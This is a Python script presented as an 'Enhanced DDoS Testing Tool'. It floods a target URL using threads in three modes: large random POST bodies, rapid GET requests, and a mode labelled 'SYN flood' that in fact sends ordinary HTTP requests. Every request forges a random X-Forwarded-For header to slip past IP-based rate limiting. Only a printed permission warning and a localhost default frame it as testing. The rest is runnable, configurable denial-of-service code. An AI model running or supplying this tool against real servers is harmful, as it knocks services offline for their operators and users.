import requests
import threading
import time
import random
import string
import argparse
from concurrent.futures import ThreadPoolExecutor
import os

def generate_random_data(size):
    """Generate random data of specified size in bytes"""
    return ''.join(random.choices(string.ascii_letters + string.digits, k=size))

def bandwidth_attack(url, data_size=1024*1024):  # 1MB of data per request
    """Send large POST requests to consume bandwidth"""
    try:
        payload = generate_random_data(data_size)
        headers = {
            'Content-Type': 'application/json',
            'X-Forwarded-For': f'{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}'
        }
        response = requests.post(url + '/api/data', data=payload, headers=headers)
        return len(payload)
    except Exception as e:
        print(f"Error in bandwidth attack: {e}")
        return 0

def syn_flood(url):
    """Simulate SYN flood by opening and immediately closing connections"""
    try:
        requests.get(url, timeout=1)
    except:
        pass

def http_flood(url):
    """Send rapid HTTP GET requests"""
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'X-Forwarded-For': f'{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}'
        }
        requests.get(url, headers=headers)
    except:
        pass

def run_attack(attack_type, url, duration, threads, data_size=1024*1024):
    """Main attack coordinator"""
    print(f"Starting {attack_type} attack against {url}")
    print(f"Duration: {duration} seconds")
    print(f"Threads: {threads}")
    
    start_time = time.time()
    total_data_sent = 0
    request_count = 0

    with ThreadPoolExecutor(max_workers=threads) as executor:
        while time.time() - start_time < duration:
            if attack_type == "bandwidth":
                futures = [executor.submit(bandwidth_attack, url, data_size) for _ in range(threads)]
                for future in futures:
                    total_data_sent += future.result()
            elif attack_type == "syn":
                futures = [executor.submit(syn_flood, url) for _ in range(threads)]
            elif attack_type == "http":
                futures = [executor.submit(http_flood, url) for _ in range(threads)]
            
            request_count += threads
            
            # Print statistics every second
            if int(time.time() - start_time) % 1 == 0:
                elapsed = time.time() - start_time
                rps = request_count / elapsed
                mbps = (total_data_sent / 1024 / 1024) / elapsed
                print(f"\rRequests: {request_count}, RPS: {rps:.2f}, Bandwidth: {mbps:.2f} MB/s", end='')

    print("\nAttack completed")
    print(f"Total requests: {request_count}")
    print(f"Total data sent: {total_data_sent / 1024 / 1024:.2f} MB")
    print(f"Average bandwidth: {(total_data_sent / 1024 / 1024) / duration:.2f} MB/s")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Enhanced DDoS Testing Tool')
    parser.add_argument('--url', default='http://localhost:5000', help='Target URL')
    parser.add_argument('--type', choices=['bandwidth', 'syn', 'http'], default='bandwidth', help='Attack type')
    parser.add_argument('--duration', type=int, default=30, help='Attack duration in seconds')
    parser.add_argument('--threads', type=int, default=50, help='Number of threads')
    parser.add_argument('--size', type=int, default=1024*1024, help='Data size per request in bytes (for bandwidth attack)')
    
    args = parser.parse_args()
    
    print("Enhanced DDoS Testing Tool")
    print("WARNING: This tool is for testing purposes only!")
    print("Make sure you have permission to test the target system.")
    
    try:
        run_attack(args.type, args.url, args.duration, args.threads, args.size)
    except KeyboardInterrupt:
        print("\nAttack stopped by user")
    except Exception as e:
        print(f"\nError: {e}") 